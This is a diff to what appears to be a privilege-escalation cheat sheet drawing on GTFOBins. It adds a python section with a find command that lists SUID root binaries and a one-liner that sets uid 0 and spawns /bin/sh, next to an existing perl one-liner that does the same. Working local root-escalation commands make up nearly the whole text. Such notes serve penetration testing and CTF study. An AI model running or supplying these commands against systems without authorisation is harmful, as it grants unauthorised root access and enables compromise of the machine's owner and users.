@@ -17,7 +17,16 @@ If:
 ```
 /usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
 ```
-
+# CAPABILITIES - python
+https://gtfobins.github.io/gtfobins/python/#suid
+```
+find / -user root -perm /4000
+```
+If:
+/usr/bin/python
+```
+/usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/sh")'
+```
 # .. /tar
 https://gtfobins.github.io/gtfobins/tar/
 ```
